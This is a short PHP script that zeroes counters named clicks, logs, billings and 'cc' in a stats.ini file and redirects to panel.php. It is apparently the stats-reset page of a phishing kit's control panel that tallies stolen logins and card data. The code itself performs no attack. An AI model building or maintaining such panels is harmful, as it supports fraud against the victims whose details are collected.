<?php

$filepath = './stats.ini';
$data = @parse_ini_file($filepath);
$data['cliques']=0;$data['logs']=0;$data['billings']=0;$data['cc']=0;;
			function update_ini_file($data, $filepath) {
              $content = "";
              $parsed_ini = parse_ini_file($filepath, true);
              foreach($data as $section => $values){
                if($section === "submit"){
                  continue;
                }
                $content .= $section ."=". $values . "\n\r";
              }
              if (!$handle = fopen($filepath, 'w')) {
                return false;
              }
              $success = fwrite($handle, $content);
              fclose($handle);
            }
            update_ini_file($data, $filepath);


header("Location: ./panel.php");

?>